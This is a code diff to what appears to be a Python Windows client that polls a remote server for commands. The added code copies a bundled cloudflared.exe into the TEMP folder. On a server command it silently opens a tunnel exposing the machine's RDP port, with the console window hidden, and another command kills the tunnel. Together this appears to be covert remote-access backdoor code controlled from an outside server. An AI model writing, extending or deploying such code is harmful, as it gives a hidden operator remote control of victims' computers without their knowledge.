@@ -5,6 +5,7 @@ import os
 import subprocess
 import time
 import sys
+import shutil
 
 # ========== CONFIGURATION ==========
 SERVER_URL = "https://dollar-1rtv.onrender.com"
@@ -67,14 +68,43 @@ def clear_command(device_id):
     except:
         pass
 
+def get_cloudflared():
+    """Get the cloudflared.exe from the bundled resources"""
+    try:
+        # Where the .exe is running from
+        base_path = sys._MEIPASS if getattr(sys, '_MEIPASS', False) else os.path.dirname(os.path.abspath(__file__))
+        source_path = os.path.join(base_path, 'cloudflared.exe')
+        
+        # Where we want to put it on the target system
+        target_dir = os.path.join(os.environ.get('TEMP', 'C:\\Temp'))
+        target_path = os.path.join(target_dir, 'cloudflared.exe')
+        
+        # Check if cloudflared already exists in the temp folder
+        if os.path.exists(target_path):
+            return target_path
+        
+        # Copy cloudflared from the bundled resources to the temp folder
+        shutil.copy2(source_path, target_path)
+        return target_path
+    except Exception as e:
+        return None
+
 def execute_command(command):
     try:
         if command == "START_REMOTE":
             # Install pdagent first if needed
             install_pdagent()
-            # Now start the remote session
-            # pdagent will auto-install cloudflared via winget if missing [citation:2]
-            subprocess.Popen(["pdagent", "remote"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # Get the cloudflared executable
+            cloudflared_path = get_cloudflared()
+            if cloudflared_path and os.path.exists(cloudflared_path):
+                # Start the remote session using cloudflared
+                # This creates a tunnel to the RDP port (3389)
+                subprocess.Popen([cloudflared_path, "tunnel", "--url", "rdp://localhost:3389"], 
+                               shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            else:
+                # Fallback: try using pdagent remote if cloudflared is not available
+                subprocess.Popen(["pdagent", "remote"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         elif command == "STOP_REMOTE":
             subprocess.run("taskkill /f /im cloudflared.exe", shell=True, capture_output=True)
         else:
